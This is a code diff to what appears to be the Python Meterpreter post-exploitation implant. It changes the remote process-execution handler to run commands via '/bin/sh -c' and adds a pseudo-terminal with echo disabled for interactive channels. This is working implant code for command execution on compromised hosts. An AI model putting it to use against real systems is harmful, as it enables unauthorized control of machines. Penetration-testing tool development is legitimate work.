@@ -13,10 +13,22 @@ import subprocess
 has_windll = hasattr(ctypes, 'windll')
 
 try:
+	import pty
+	has_pty = True
+except ImportError:
+	has_pty = False
+
+try:
 	import pwd
 	has_pwd = True
 except ImportError:
 	has_pwd = False
+
+try:
+	import termios
+	has_termios = True
+except ImportError:
+	has_termios = False
 
 try:
 	import _winreg as winreg
@@ -371,10 +383,25 @@ def stdapi_sys_process_execute(request, response):
 	flags = packet_get_tlv(request, TLV_TYPE_PROCESS_FLAGS)['value']
 	if len(cmd) == 0:
 		return ERROR_FAILURE, response
-	args = [cmd]
-	args.extend(shlex.split(raw_args))
+	if os.path.isfile('/bin/sh'):
+		args = ['/bin/sh', '-c', cmd, raw_args]
+	else:
+		args = [cmd]
+		args.extend(shlex.split(raw_args))
 	if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
-		proc_h = STDProcess(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		if has_pty:
+			master, slave = pty.openpty()
+			if has_termios:
+				settings = termios.tcgetattr(master)
+				settings[3] = settings[3] & ~termios.ECHO
+				termios.tcsetattr(master, termios.TCSADRAIN, settings)
+			proc_h = STDProcess(args, stdin=slave, stdout=slave, stderr=slave, bufsize=0)
+			proc_h.stdin = os.fdopen(master, 'wb')
+			proc_h.stdout = os.fdopen(master, 'rb')
+			proc_h.stderr = open(os.devnull, 'rb')
+		else:
+			proc_h = STDProcess(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		proc_h.start()
 	else:
 		proc_h = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	proc_h_id = len(meterpreter.processes)
